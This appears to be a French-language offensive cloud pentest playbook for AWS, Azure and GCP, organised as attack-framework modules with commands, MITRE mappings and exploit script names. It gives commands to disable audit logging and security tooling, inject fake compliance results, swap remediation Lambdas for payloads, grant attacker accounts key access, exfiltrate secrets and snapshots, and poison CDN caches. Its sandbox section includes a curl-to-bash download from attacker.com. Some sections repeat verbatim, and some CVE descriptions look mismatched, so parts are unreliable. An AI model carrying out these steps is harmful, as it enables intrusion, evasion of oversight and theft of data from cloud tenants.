- **Analyser les policies permissives** (wildcards, action illimitées, exclusions)
  ```bash
  awspx enum --policies --output awspx_output.json
  az role definition list --custom-role-only true
  gcloud org-policies list --organization=org-id
  ```

- **Détection de bypass typiques :**
  - **AWS SCP avec wildcard `*`**
  - **Azure Policy `notExists` contournable**
  - **GCP Constraint bypass par serviceAccount impersonation**

---

## 🚨 PHASE 3 – ABUS ET CONTRE-MESURES DE GOUVERNANCE

- **Upload faux rapport dans AWS Config**
  ```bash
  aws config put-evaluations --evaluations file://fake-compliance.json
  ```

- **Désactivation CloudTrail en pivot**
  ```bash
  aws cloudtrail stop-logging --name maintrail
  ```

- **Replay log GCP / bucket hijack**
  ```bash
  gsutil cp fake_log.json gs://audit-logs-bucket/
  ```

- **Azure Policy confusion avec custom scope**
  ```bash
  az policy assignment create --name "fakePolicy" --scope "/subscriptions/<id>/resourceGroups/<RG>"
  ```

---

## 🧪 PHASE 4 – SIMULATION HEURISTIQUE TTP

| Tactic                  | Action                                                                 |
|-------------------------|------------------------------------------------------------------------|
| **Defense Evasion**     | `aws config delete-delivery-channel`                                   |
| **Initial Access**      | Hijack of audit sink misconfigured on public bucket                    |
| **Persistence**         | Create fake policy assigned to ghost group                             |
| **Privilege Escalation**| Escalate via `organizations:EnablePolicyType`                          |
| **Impact**              | Suppression de tous les logs trails                                     |

---

## ⚔️ PHASE 5 – TOOLS DE PENTEST ASSOCIÉS

```bash
• Pacu → cloudtrail_disable / config_exfil
• PMapper → graph IAM & policy bypass
• CloudSploit / ScoutSuite → check governance gaps
• gcp_enum / gcp_exploits → asset / sink abuse
```

---

## 🛠 SCRIPTS AUTOMATIQUES

```bash
governance_enum.sh     → liste comptes / policies / trails / config
policy_abuse.sh        → generate / assign / manipulate policies
trail_bypass.sh        → stop logging + hijack storage
fake_compliance.sh     → inject faux résultats compliance
```

---

## 🗂 OUTPUTS

```plaintext
/output/cloud/gov/enum/accounts.txt
/output/cloud/gov/policy/policy_misconfig.log
/output/cloud/gov/audit/fake_logs_injected.json
/output/cloud/gov/compliance/fake_evaluations.flag
```

---

## 🧠 `engine_cloud_mgmt_governance()`

### 🎯 OBJECTIF :
- Identifier, détourner ou abuser des systèmes de **monitoring/audit**
- Détourner la **chaîne de confiance et de compliance**
- Dénicher les **failles de gestion centralisée de comptes / policies**
- Abuser les mécanismes de **logs, quotas, rôles transverses**

---

## 🧩 TYPE_ABSTRAIT : `CloudGovernanceTarget`

```plaintext
CloudGovernanceTarget {
    provider: AWS | Azure | GCP,
    org_structure: boolean,
    cloudtrail_enabled: boolean,
    config_rules_active: boolean,
    policy_set: boolean,
    audit_logs_exposed: boolean,
    misconfigured_policies: [string],
    cross_account_links: [string],
    identity_zones: [string],
    raw_signals: [Signal],
    governance_bypass_detected: boolean
}
```

---

## 🔍 PHASE 1 – RECO / ENUMÉRATION GOUVERNANCE

- **Lister tous les services de contrôle actif**
  ```bash
  aws config describe-config-rules
  aws organizations list-accounts
  az policy definition list
  gcloud asset search-all-resources
  ```

- **Identifier les éléments manquants ou désactivés**
  ```bash
  aws cloudtrail describe-trails
  aws config describe-delivery-channels
  gcloud logging sinks list
  ```

- **Vérifier les expositions de log bucket ou audit sinks**
  ```bash
  aws s3 ls s3://cloudtrail-logs/ --no-sign-request
  gcloud storage ls gs://audit-logs-bucket
  ```

---

## 🕵️ PHASE 2 – ANALYSE POLICIES, CONSTRAINTS, EXCEPTIONS

- **Analyser les policies permissives** (wildcards, action illimitées, exclusions)
  ```bash
  awspx enum --policies --output awspx_output.json
  az role definition list --custom-role-only true
  gcloud org-policies list --organization=org-id
  ```

- **Détection de bypass typiques :**
  - **AWS SCP avec wildcard `*`**
  - **Azure Policy `notExists` contournable**
  - **GCP Constraint bypass par serviceAccount impersonation**

---

## 🚨 PHASE 3 – ABUS ET CONTRE-MESURES DE GOUVERNANCE

- **Upload faux rapport dans AWS Config**
  ```bash
  aws config put-evaluations --evaluations file://fake-compliance.json
  ```

- **Désactivation CloudTrail en pivot**
  ```bash
  aws cloudtrail stop-logging --name maintrail
  ```

- **Replay log GCP / bucket hijack**
  ```bash
  gsutil cp fake_log.json gs://audit-logs-bucket/
  ```

- **Azure Policy confusion avec custom scope**
  ```bash
  az policy assignment create --name "fakePolicy" --scope "/subscriptions/<id>/resourceGroups/<RG>"
  ```

---

## 🧪 PHASE 4 – SIMULATION HEURISTIQUE TTP

| Tactic                  | Action                                                                 |
|-------------------------|------------------------------------------------------------------------|
| **Defense Evasion**     | `aws config delete-delivery-channel`                                   |
| **Initial Access**      | Hijack of audit sink misconfigured on public bucket                    |
| **Persistence**         | Create fake policy assigned to ghost group                             |
| **Privilege Escalation**| Escalate via `organizations:EnablePolicyType`                          |
| **Impact**              | Suppression de tous les logs trails                                     |

---

## ⚔️ PHASE 5 – TOOLS DE PENTEST ASSOCIÉS

```bash
• Pacu → cloudtrail_disable / config_exfil
• PMapper → graph IAM & policy bypass
• CloudSploit / ScoutSuite → check governance gaps
• gcp_enum / gcp_exploits → asset / sink abuse
```

---

## 🛠 SCRIPTS AUTOMATIQUES

```bash
governance_enum.sh     → liste comptes / policies / trails / config
policy_abuse.sh        → generate / assign / manipulate policies
trail_bypass.sh        → stop logging + hijack storage
fake_compliance.sh     → inject faux résultats compliance
```

---

## 🗂 OUTPUTS

```plaintext
/output/cloud/gov/enum/accounts.txt
/output/cloud/gov/policy/policy_misconfig.log
/output/cloud/gov/audit/fake_logs_injected.json
/output/cloud/gov/compliance/fake_evaluations.flag
```

---

## 🧠 `engine_cloud_security_compliance()`

### 🎯 OBJECTIF :
- Détecter et détourner les mécanismes de **Cloud Security Posture Management (CSPM)**  
- Abuser les services de **compliance automatisée**, **alerte**, **EDR cloud**, et **audit**
- Évaluer les **politiques de durcissement**, les mécanismes d’**auto-remédiation**, et les **dérives**

---

## 🧩 TYPE_ABSTRAIT : `CloudSecurityComplianceTarget`

```plaintext
CloudSecurityComplianceTarget {
    provider: AWS | Azure | GCP,
    cspm_enabled: boolean,
    detective_enabled: boolean,
    guardduty_enabled: boolean,
    security_center_active: boolean,
    security_command_center_gcp: boolean,
    compliance_gaps: [string],
    threat_detection_configured: boolean,
    monitoring_channels: [string],
    response_automation_enabled: boolean
}
```

---

## 🔍 PHASE 1 – ENUMÉRATION DES OUTILS DE SÉCURITÉ CLOUD

```bash
# AWS
aws securityhub get-enabled-standards
aws guardduty list-detectors
aws config describe-aggregate-compliance-by-config-rules
aws detective list-graphs

# Azure
az security assessment-metadata list
az security auto-provisioning-setting list
az policy state list

# GCP
gcloud scc sources list
gcloud scc findings list --source=<source-id>
gcloud scc settings describe --organization=org-id
```

---

## 🕵️ PHASE 2 – DETECTION DES FAILLES / MISES EN PLACE INCOMPLÈTES

- **Compliance non activée sur régions**
- **GuardDuty sans déclencheur S3 / IAM**
- **SecurityHub partiellement activé ou pas de cross-region**
- **Auto-remédiation absente (AWS Config Rules, Azure Defender Response)**
- **Alerting trop permissif ou silencieux**

---

## 🛠 PHASE 3 – ABUS DES MECHANISMES CSPM / SOC / SIEM CLOUD

### 🧪 AWS

- **Désactiver SecurityHub discrètement**
  ```bash
  aws securityhub disable-security-hub
  ```

- **Inverser les réponses Lambda de remédiation**
  ```bash
  aws lambda update-function-code --function-name "AutoFixer" --zip-file fileb://evilpayload.zip
  ```

- **GuardDuty Simulation**
  ```bash
  aws guardduty create-sample-findings
  ```

- **Rogue Config Rule**
  ```bash
  aws config put-config-rule --config-rule file://evil-rule.json
  ```

### 🧪 Azure

- **Bypass Azure Defender**
  ```bash
  az security setting update --name "MCAS" --enabled false
  ```

- **Injection de fausses alertes ou suppression**
  ```bash
  az monitor diagnostic-settings delete --name “SIEM”
  ```

### 🧪 GCP

- **Desactivation Security Command Center**
  ```bash
  gcloud scc settings update --disable
  ```

- **Override des findings avec scripts**
  ```bash
  gcloud scc findings update <finding-id> --severity=LOW
  ```

---

## ⚔️ PHASE 4 – OUTILS DE PENTEST ASSOCIÉS

- **CloudSploit / ScoutSuite / Prowler** (Audit CSPM / compliance gaps)
- **Pacu Modules** : `securityhub_disable`, `guardduty_simulation`, `config_rules_create`
- **CloudGOAT / FLAWS / CloudKatana** pour scénarios simulés
- **Cloud Custodian** → abus des règles de remédiation automatique
- **Autoexploit** (custom scripts de payload Lambda auto-défensifs)

---

## 💣 PHASE 5 – STRATÉGIES TTP MITRE

| Tactic             | Technique                           | Action                                                          |
|--------------------|--------------------------------------|-----------------------------------------------------------------|
| **Defense Evasion**| T1562.006 (Disable Security Tools)   | `aws guardduty stop-detector`                                   |
| **Persistence**     | T1053.005 (Scheduled Task/Job)       | Inject remediate → reboot tunnel                                |
| **Impact**          | T1485 (Data Destruction)             | Upload auto-wipe policies in auto-remediate                     |
| **Discovery**       | T1087.002 (Cloud Accounts)           | Enum cross-account CSPM scoping                                |
| **Collection**      | T1119 (Automated Collection)         | Capture cloudtrail logs via misconfigured bucket                |

---

## 📜 SCRIPTS GÉNÉRÉS

```bash
cspm_enum.sh → reconnaissance globale des CSPM
cspm_bypass.sh → désactivation + simulation GuardDuty
cspm_remediation_attack.sh → auto-remediation hijack
securityhub_override.sh → suppression policies & logs
```

---

## 🗂 OUTPUTS

```plaintext
/output/cloud/security_compliance/findings_summary.md
/output/cloud/security_compliance/bypass_success.log
/output/cloud/security_compliance/guardduty_alerts.log
/output/cloud/security_compliance/simulation_results.json
```

---

## 🔐 `engine_cloud_key_management()`

### 🎯 OBJECTIF :
- Cartographier et abuser les systèmes de **gestion de clés** (KMS, CloudHSM, Key Vault)
- Tester les mauvaises configurations liées au **chiffrement**, à l’**accès IAM**, à la **réutilisation des clés**
- Déclencher des **post-exploitations cryptographiques** (exfiltration, downgrade, etc.)

---

## 🧩 TYPE_ABSTRAIT : `CloudKeyManagementTarget`

```plaintext
CloudKeyManagementTarget {
  provider: AWS | Azure | GCP,
  kms_services: [string],
  hsm_enabled: boolean,
  keys_list: [KeyMetadata],
  cross_account_sharing: boolean,
  encryption_contexts: [string],
  aliases: [string],
  iam_policies: [IAMPolicy],
  auto_rotation_enabled: boolean,
  logs_enabled: boolean,
  anomalies_detected: [string]
}
```

---

## 🔍 PHASE 1 – ENUMÉRATION DES CLÉS ET CONTEXTES

```bash
# AWS
aws kms list-keys
aws kms describe-key --key-id <key>
aws kms list-aliases
aws kms get-key-policy --key-id <key> --policy-name default

# Azure
az keyvault key list --vault-name <vault>
az keyvault key show --name <key> --vault-name <vault>
az keyvault show --name <vault> --query "properties.enableSoftDelete"

# GCP
gcloud kms keys list --location global --keyring <keyring>
gcloud kms keys describe <key>
```

---

## 🔓 PHASE 2 – ABUS DE CONFIGURATIONS KMS / HSM / VAULT

### 🔐 AWS

- 🔥 **Clé non restreinte IAM**
  ```bash
  aws kms decrypt --ciphertext-blob fileb://encrypted.bin --key-id <key>
  ```

- 🔥 **Clé partagée cross-account** (shadow org abuse)
  ```bash
  aws kms list-grants --key-id <key>
  aws kms revoke-grant --key-id <key> --grant-id <id>
  ```

- 🔥 **Exploit des alias faibles**
  ```bash
  aws kms describe-key --key-id alias/aliasname
  ```

### 🔐 Azure

- 🔥 **Policy Permissions escalation**
  ```bash
  az keyvault set-policy --name <vault> --object-id <id> --key-permissions backup restore get list
  ```

- 🔥 **Secrets recovery / export**
  ```bash
  az keyvault secret backup --vault-name <vault> --name <secret>
  ```

### 🔐 GCP

- 🔥 **IAM misconfiguration over CryptoKey**
  ```bash
  gcloud kms keys add-iam-policy-binding <key> --member user:evil@attacker.com --role roles/cloudkms.cryptoKeyEncrypterDecrypter
  ```

---

## 📉 PHASE 3 – FAILLES COMMUNES DÉTECTABLES

- Clés **non rotatives**
- Clés **accessibles en lecture** sans **logs**
- **Re-use** de clés pour S3 / EBS / RDS sans partitionnement
- **Cross-account grants**
- **IAM passrole abuse** pour usurper des rôles KMS
- Clé **non protégée par encryption context**
- Vault ou KeyRing **sans suppression ou audit activé**

---

## ⚔️ PHASE 4 – OUTILS DE PENTEST ASSOCIÉS

| Outil                | Usage clé                                     |
|----------------------|-----------------------------------------------|
| **Pacu**             | `kms__enum`, `kms__backdoor`, `kms__decrypt`  |
| **ScoutSuite**       | Detection des vulnérabilités IAM/KMS          |
| **Cloudsploit**      | Audit des mauvaises pratiques de clés         |
| **Cloudgoat**        | Escalade via `KMS Key Decrypt Abuse`          |
| **Steampipe**        | Requêtes SQL sur policy KMS/AzureKeyVault     |

---

## 🧪 PHASE 5 – TECHNIQUES MITRE

| Tactic               | Technique                    | Exemple                                      |
|----------------------|-------------------------------|----------------------------------------------|
| **Credential Access** | T1552.004 (Private Keys)      | Download backup secrets via Azure Vault      |
| **Privilege Escalation** | T1098.001 (IAM Abuse)     | Add encrypter rights on KMS key              |
| **Defense Evasion**  | T1562.006 (Disable Logging)    | Remove CloudTrail from decrypt API calls     |
| **Collection**       | T1119 (Automated Collection)   | Scan and decrypt stored objects              |

---

## 🗃 OUTPUTS / SCRIPTS

```bash
kms_enum.sh → list + describe all KMS
kms_abuse.sh → decrypt & revoke
vault_policy_attack.sh → escalate key access
azure_vault_stealer.ps1 → secret backup & replay
```

```plaintext
/output/cloud/kms/keys_dump.json
/output/cloud/kms/unauthorized_decrypt.log
/output/cloud/kms/vault_exfil_summary.md
```

---

## 💾 `engine_cloud_backup_restore()`

### 🎯 OBJECTIF :
- Enumérer et abuser les services de **sauvegarde cloud-native** : snapshots, policies, restores
- Exploiter les **mauvaises configurations IAM**, les **restores intercomptes**, les **vaults exposés**
- Détourner les sauvegardes pour accéder à des données sensibles, **crypter, restaurer ou injecter des payloads**

---

## 🧩 TYPE_ABSTRAIT : `CloudBackupTarget`

```plaintext
CloudBackupTarget {
  provider: AWS | Azure | GCP,
  backup_services: [string],
  vaults: [VaultObject],
  cross_account_restore_enabled: boolean,
  backup_policies: [string],
  snapshot_exposure: boolean,
  restore_rights: boolean,
  retention_policies: [string],
  logs_enabled: boolean
}
```

---

## 🔍 PHASE 1 – ENUMÉRATION DES BACKUPS, SNAPSHOTS ET POLICIES

```bash
# AWS
aws backup list-backup-vaults
aws backup list-recovery-points-by-backup-vault --backup-vault-name <vault>
aws ec2 describe-snapshots --owner-ids self

# Azure
az backup vault list
az backup item list --vault-name <vault> --resource-group <rg>
az snapshot list

# GCP
gcloud compute snapshots list
gcloud beta backup-dr backup-plans list
gcloud beta backup-dr backup-schedules list
```

---

## 🛠 PHASE 2 – POST-EXPLOIT / ABUS DES RESTORES ET DE LA RÉTENTION

### 🧨 AWS Snapshots

- 🔓 **Dump de volume EC2** (lecture non chiffrée)
  ```bash
  aws ec2 create-volume --snapshot-id <snap> --availability-zone us-east-1a
  aws ec2 attach-volume ...
  ```

- 🎯 **Cross-account clone**
  ```bash
  aws ec2 modify-snapshot-attribute --snapshot-id snap-xxxx --attribute createVolumePermission --operation-type add --user-ids 123456789012
  ```

- 💣 **Replace Volume by Payload**
  ```bash
  aws ec2 create-snapshot --volume-id vol-evil --description "evil volume"
  ```

### 🧨 Azure Backup

- 🧬 **Vault access policy abuse**
  ```bash
  az backup policy list-associations
  az backup vault backup-properties update --name <vault> --soft-delete-feature-state Disabled
  ```

- 🧨 **Exfiltration sur Azure Files backup**
  ```bash
  az backup restore restore-azurefiles --container-name <...>
  ```

### 🧨 GCP Backup

- 🛠 **Clone of Cloud SQL backup**
  ```bash
  gcloud sql backups list
  gcloud sql backups restore --backup-id=<id> --instance=new-instance
  ```

- 🪓 **GKE Volume Restore**
  ```bash
  gcloud beta backup-dr restore-jobs create
  ```

---

## 🕳 PHASE 3 – FAILLES TYPIQUES

| ⚠️ Vulnérabilité                         | Description                                           |
|------------------------------------------|--------------------------------------------------------|
| Snapshot public                           | Snap EC2/Disks accessibles à tous                     |
| Cross-account permission                 | Restore/Clone par un autre compte sans alerte         |
| IAM restore sans MFA                     | Restore possible avec simple user/key                 |
| Rétention faible / deletable             | Backup auto-supprimés sans archive                    |
| Vault non chiffré / pas d’audit trail    | Pas de CloudTrail / Eventhub / Stackdriver activé     |

---

## ⚔️ PHASE 4 – OUTILS DE PENTEST ASSOCIÉS

| 🔧 Outil         | Usage dans le module                                    |
|------------------|----------------------------------------------------------|
| **Pacu**         | `ebs__enum_public_snapshots`, `backup__abuse_restore`    |
| **Cloudsploit**  | Vérifie snapshots publics, retentions faibles            |
| **ScoutSuite**   | Audit des permissions IAM sur backup & restore           |
| **Steampipe**    | Requêtes SQL multi-cloud sur snapshots / vault           |
| **Custom Tools** | Dump + attach automatique à instance compromise          |

---

## 🎯 TECHNIQUES MITRE APPLIQUÉES

| Tactic            | Technique                            | Exploits possibles                                      |
|-------------------|----------------------------------------|---------------------------------------------------------|
| **Collection**    | T1119 (Automated Collection)           | Restauration de volume cloud vers clone attaquant       |
| **Lateral Move**  | T1021.004 (Remote Volume Mount)        | Montage de disque backup sur autre VM                   |
| **Defense Evasion** | T1562.006 (Disable Snapshot Logging) | Modification des logs de restauration                   |
| **Exfiltration**  | T1537 (Transfer Volume to 3rd party)   | Clonage d’instances restaurées vers VM non monitorées   |

---

## 🧪 PHASE 5 – SCRIPTS D’EXPLOIT

```bash
backup_enum.sh → liste snapshots + policies
backup_restore_abuse.sh → restauration non autorisée
backup_exfiltrate.sh → dump de volume restauré
backup_inject_payload.sh → remplacement snapshot
```

---

## 🗃 OUTPUTS

```plaintext
/output/cloud/backup_restore/vault_dump.json
/output/cloud/backup_restore/clone_restore_success.log
/output/cloud/backup_restore/public_snapshots_exposed.txt
/output/cloud/backup_restore/post_restore_loot/
```

---

## 💾 `engine_cloud_backup_restore()`

### 🎯 OBJECTIF :
- Enumérer et abuser les services de **sauvegarde cloud-native** : snapshots, policies, restores
- Exploiter les **mauvaises configurations IAM**, les **restores intercomptes**, les **vaults exposés**
- Détourner les sauvegardes pour accéder à des données sensibles, **crypter, restaurer ou injecter des payloads**

---

## 🧩 TYPE_ABSTRAIT : `CloudBackupTarget`

```plaintext
CloudBackupTarget {
  provider: AWS | Azure | GCP,
  backup_services: [string],
  vaults: [VaultObject],
  cross_account_restore_enabled: boolean,
  backup_policies: [string],
  snapshot_exposure: boolean,
  restore_rights: boolean,
  retention_policies: [string],
  logs_enabled: boolean
}
```

---

## 🔍 PHASE 1 – ENUMÉRATION DES BACKUPS, SNAPSHOTS ET POLICIES

```bash
# AWS
aws backup list-backup-vaults
aws backup list-recovery-points-by-backup-vault --backup-vault-name <vault>
aws ec2 describe-snapshots --owner-ids self

# Azure
az backup vault list
az backup item list --vault-name <vault> --resource-group <rg>
az snapshot list

# GCP
gcloud compute snapshots list
gcloud beta backup-dr backup-plans list
gcloud beta backup-dr backup-schedules list
```

---

## 🛠 PHASE 2 – POST-EXPLOIT / ABUS DES RESTORES ET DE LA RÉTENTION

### 🧨 AWS Snapshots

- 🔓 **Dump de volume EC2** (lecture non chiffrée)
  ```bash
  aws ec2 create-volume --snapshot-id <snap> --availability-zone us-east-1a
  aws ec2 attach-volume ...
  ```

- 🎯 **Cross-account clone**
  ```bash
  aws ec2 modify-snapshot-attribute --snapshot-id snap-xxxx --attribute createVolumePermission --operation-type add --user-ids 123456789012
  ```

- 💣 **Replace Volume by Payload**
  ```bash
  aws ec2 create-snapshot --volume-id vol-evil --description "evil volume"
  ```

### 🧨 Azure Backup

- 🧬 **Vault access policy abuse**
  ```bash
  az backup policy list-associations
  az backup vault backup-properties update --name <vault> --soft-delete-feature-state Disabled
  ```

- 🧨 **Exfiltration sur Azure Files backup**
  ```bash
  az backup restore restore-azurefiles --container-name <...>
  ```

### 🧨 GCP Backup

- 🛠 **Clone of Cloud SQL backup**
  ```bash
  gcloud sql backups list
  gcloud sql backups restore --backup-id=<id> --instance=new-instance
  ```

- 🪓 **GKE Volume Restore**
  ```bash
  gcloud beta backup-dr restore-jobs create
  ```

---

## 🕳 PHASE 3 – FAILLES TYPIQUES

| ⚠️ Vulnérabilité                         | Description                                           |
|------------------------------------------|--------------------------------------------------------|
| Snapshot public                           | Snap EC2/Disks accessibles à tous                     |
| Cross-account permission                 | Restore/Clone par un autre compte sans alerte         |
| IAM restore sans MFA                     | Restore possible avec simple user/key                 |
| Rétention faible / deletable             | Backup auto-supprimés sans archive                    |
| Vault non chiffré / pas d’audit trail    | Pas de CloudTrail / Eventhub / Stackdriver activé     |

---

## ⚔️ PHASE 4 – OUTILS DE PENTEST ASSOCIÉS

| 🔧 Outil         | Usage dans le module                                    |
|------------------|----------------------------------------------------------|
| **Pacu**         | `ebs__enum_public_snapshots`, `backup__abuse_restore`    |
| **Cloudsploit**  | Vérifie snapshots publics, retentions faibles            |
| **ScoutSuite**   | Audit des permissions IAM sur backup & restore           |
| **Steampipe**    | Requêtes SQL multi-cloud sur snapshots / vault           |
| **Custom Tools** | Dump + attach automatique à instance compromise          |

---

## 🎯 TECHNIQUES MITRE APPLIQUÉES

| Tactic            | Technique                            | Exploits possibles                                      |
|-------------------|----------------------------------------|---------------------------------------------------------|
| **Collection**    | T1119 (Automated Collection)           | Restauration de volume cloud vers clone attaquant       |
| **Lateral Move**  | T1021.004 (Remote Volume Mount)        | Montage de disque backup sur autre VM                   |
| **Defense Evasion** | T1562.006 (Disable Snapshot Logging) | Modification des logs de restauration                   |
| **Exfiltration**  | T1537 (Transfer Volume to 3rd party)   | Clonage d’instances restaurées vers VM non monitorées   |

---

## 🧪 PHASE 5 – SCRIPTS D’EXPLOIT

```bash
backup_enum.sh → liste snapshots + policies
backup_restore_abuse.sh → restauration non autorisée
backup_exfiltrate.sh → dump de volume restauré
backup_inject_payload.sh → remplacement snapshot
```

---

## 🗃 OUTPUTS

```plaintext
/output/cloud/backup_restore/vault_dump.json
/output/cloud/backup_restore/clone_restore_success.log
/output/cloud/backup_restore/public_snapshots_exposed.txt
/output/cloud/backup_restore/post_restore_loot/
```

---

## 🌍 `engine_cloud_cdn_delivery()`

### 🎯 OBJECTIF :
- Identifier les configurations vulnérables sur les services CDN
- Exploiter les failles de cache, de réécriture d’URL, de mauvaises politiques de headers
- Mener des attaques de type **cache poisoning, origin attack, credential forwarding, prefetch abuse**
- Détourner la logique de routage CDN vers une **prise de contrôle, data exfiltration, ou shadow CDN**

---

## 📦 TYPE_ABSTRAIT : `CloudCDNTarget`

```plaintext
CloudCDNTarget {
  provider: AWS | Azure | GCP,
  cdn_distribution_ids: [string],
  origin_domains: [string],
  forwarding_headers: [string],
  behaviors: [string],
  ssl_policy: string,
  allow_override_origin: boolean,
  custom_error_responses: boolean,
  caching_rules: [string],
  url_rewrites_enabled: boolean,
  waf_attached: boolean
}
```

---

## 🔎 PHASE 1 — ENUM CDN CONFIG + ORIGINS

```bash
# AWS
aws cloudfront list-distributions
aws cloudfront get-distribution-config --id <id>

# Azure
az afd profile list
az cdn endpoint list

# GCP
gcloud compute url-maps list
gcloud compute backend-services list

# Recon
curl -I -H "Host: real-origin.com" https://<cdn-domain>
curl -H "x-forwarded-host: attacker.com" -v https://<cdn>
```

---

## 💣 PHASE 2 — EXPLOITATION DES FAIBLESSES CLASSIQUES

### ⚔️ Technique : **CDN Cache Poisoning**

```bash
# Injection d’en-tête caché, retourne payload stocké
curl -H "X-Forwarded-Host: evil.com" https://cdn.target.com/login
curl -H "X-Original-URL: /admin" -H "X-Forwarded-Scheme: http" https://cdn.target.com/
```

- ⚠️ Vulnérable si le cache ne différencie pas les en-têtes injectés (header-based poisoning)
- ⚠️ Réécriture d’URL mal gérée + mauvaise isolation entre les versions HTTP

### ⚔️ Technique : **Origin Server Exposure**

- Si `origin` = IP non protégée → attaque directe
- Scanner l’IP via `Shodan`, puis :
  ```bash
  curl http://<origin-ip> --host cdn.target.com
  ```

### ⚔️ Technique : **Credential Forwarding**

- CDN relaye un header sensible type `Authorization: Bearer`
- Exemple :
  ```bash
  curl -H "Authorization: Bearer abc123" https://cdn.target.com/
  ```

  ⚠️ Si l’origin le traite → session hijack possible.

---

## ⚙️ PHASE 3 — OUTILS ET SCAN DE PENTEST

| Outil             | Usage                                    |
|-------------------|------------------------------------------|
| **ParamSpider**   | Extraction des endpoints vulnérables      |
| **cdnstrip**      | Check des comportements CDN atypiques     |
| **Burp Suite Pro**| Header smuggling + Cache poison scanner  |
| **CloudSploit**   | Enum policies CDN sur AWS                |
| **MitmProxy**     | Simulation CDN vers origin directe        |

---

## 🔥 PHASE 4 — ATTAQUES AVANCÉES

- **Prefetch Attack / Request Coalescing**
  - Insertion dans CDN d’une requête lente
  - Tous les utilisateurs reçoivent la même réponse injectée

- **Misconfigured Path-Based Routing**
  - `cdn.example.com/js/*` → leaks sur `/admin/*`

- **SSL Downgrade Attack**
  - `cdn → origin` sans TLS

---

## 🕵️ MITRE & CVE MAPPING

| Tactic             | Technique                    | Exemple                                                  |
|--------------------|-------------------------------|-----------------------------------------------------------|
| Initial Access     | T1190 - Exploit Public-Facing | Rebinding/Origin Poison                                   |
| Defense Evasion    | T1132 - Non-standard Encoding | Contournement CDN par header inconnu                      |
| Collection         | T1119 - Automated Collection  | Forcer cache + voler réponse dans CDN                     |
| Exfiltration       | T1041 - Exfil over Web        | Forwarding de payloads/headers par CDN                    |

---

## 🧬 PHASE 5 — CVE DE RÉFÉRENCE

| CVE ID            | Description                                      |
|-------------------|--------------------------------------------------|
| CVE-2021-22893     | CDN WAF bypass + poison via X-Origin             |
| CVE-2020-26160     | Exploit X-Forwarded-Host poisoning                |
| CVE-2021-21330     | CDN misconfig, bypass S3 private origin          |

---

## 🧪 PHASE 6 — SCRIPTS

```bash
cdn_enum.sh → collecte AWS/GCP/Azure CDN configs
cdn_cache_poison.sh → injection headers vulnérables
cdn_origin_probe.sh → test direct origin vs CDN

cdn_credential_forwarding.py → test autorisations CDN relayées
cdn_ssl_downgrade.sh → test lien CDN → origin sans HTTPS
```

---

## 🗃 OUTPUT

```plaintext
/output/cloud/cdn/cache_poison_results.log
/output/cloud/cdn/exposed_origin_ips.txt
/output/cloud/cdn/forwarded_headers_analysis.txt
/output/cloud/cdn/ssl_downgrade_detected.log
```

---

## 🧪 `engine_cloud_sandbox_attack()`

### 🔥 OBJECTIF :
Ce module identifie, analyse et exploite les mécanismes de sandbox cloud vulnérables dans des environnements tels que :

- AWS Lambda, GCP Cloud Functions, Azure Functions
- AWS CodeBuild, Azure DevOps Pipelines, GitHub Actions
- Cloud Workflows, Step Functions
- CI/CD, containers temporaires (Fargate, Cloud Run)
- Scenarios "sandboxed" mais permissifs (file uploads, plugins, PDF renderers, ML models...)

---

## 🧬 TYPE_ABSTRAIT : `CloudSandboxContext`

```plaintext
CloudSandboxContext {
  cloud_provider: AWS | GCP | Azure,
  runtime_env: NodeJS | Python | Java | Docker | Custom,
  ingress_type: HTTP | Event-based | CI/CD | Message Queue,
  permissions: [IAMPolicy],
  writable_fs: boolean,
  temp_env_variables: [string],
  preinstalled_tools: [string],
  egress_network_allowed: boolean,
  lambda_layers: [string],
  linked_services: [string],
  escape_vectors: [string],
  secrets_accessible: boolean
}
```

---

## 🚦 PHASE 1 — RECONNAISSANCE SANDBOX

### 🎯 Enum des services actifs
```bash
# AWS
aws lambda list-functions
aws codebuild list-projects
aws iam list-roles

# Azure
az functionapp list
az pipelines list
az webapp list

# GCP
gcloud functions list
gcloud run services list
gcloud builds list
```

---

## 🧨 PHASE 2 — VECTEURS D’ÉVASION COMMUNS

### 🔥 Sandbox Escape Techniques

| Type                          | Description                                                                 |
|-------------------------------|-----------------------------------------------------------------------------|
| Writeable Temp FS             | Exploit `/tmp/` pour persistence/code injection                             |
| RCE via vulnerable runtime    | Injection Python / NodeJS / Java sandboxée                                 |
| Misconfigured IAM Role        | Permissions excessives dans le rôle exécutant la sandbox                   |
| Container Boundary Escape     | CVE-2022-0185, CVE-2019-5736 (runc)                                         |
| Execution via Layer/Artifact  | Malicious .zip/.jar dans layer ou package externalisé                      |
| Egress Abuse                  | `curl`, `wget`, `nc`, etc. autorisés vers services internes                 |
| Cloud Metadata Abuse          | Exfiltration via `http://169.254.169.254`                                  |

---

## 🧱 PHASE 3 — TECHNIQUES D’INJECTION & PERSISTENCE

```bash
# Exemple payload Python
import os
os.system("curl http://attacker.com/shell.sh | bash")

# NodeJS
const http = require('http'); http.get('http://evil.com/payload')

# AWS Lambda - escape via layer
aws lambda publish-layer-version --layer-name escape-layer --zip-file fileb://payload.zip

# Metadata access
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 🧰 OUTILS DE PENTEST

| Outil               | Usage                                          |
|---------------------|------------------------------------------------|
| `lambdarest`        | Dump config, invoke endpoints, test escape     |
| `pacu`              | Post-exploitation AWS, enum & abuse policies   |
| `sam cli`           | Test sandbox local, reverse shell              |
| `Burp Suite`        | API endpoint abuse, SSRF vers cloud metadata   |
| `mitmproxy`         | Intercepter appels sandboxés sortants          |

---

## 📌 PHASE 4 — STRATÉGIES SPÉCIFIQUES

### 🧬 AWS Lambda

- Layer malveillant
- Rôle IAM attaché trop permissif
- `Write → S3 → Trigger` : Abus via file write pour rebond

### 🧬 Azure Functions

- Injection dans le trigger (HTTP POST)
- CVE : Function proxy path traversal
- `kudu` abuse → `https://<app>.scm.azurewebsites.net`

### 🧬 GCP Cloud Functions

- Debug enabled
- Environnement `env: "dev"` exposé
- Exécution via `gcloud functions call` + exfil

---

## 🛡 CVE & ATT&CK MAPPING

| CVE ID            | Description                                       |
|-------------------|---------------------------------------------------|
| CVE-2022-0185     | container breakout via Linux kernel flaw          |
| CVE-2020-8559     | API server redirect in Kubernetes sandbox         |
| CVE-2021-24092     | Azure Functions sandbox bypass                    |

| MITRE ATT&CK      | Tactic               | Technique                        |
|-------------------|----------------------|----------------------------------|
| T1203             | Exploitation for Exec| Injection dans sandbox           |
| T1071.001         | App Protocol Abuse   | HTTP vers exfiltration serveur   |
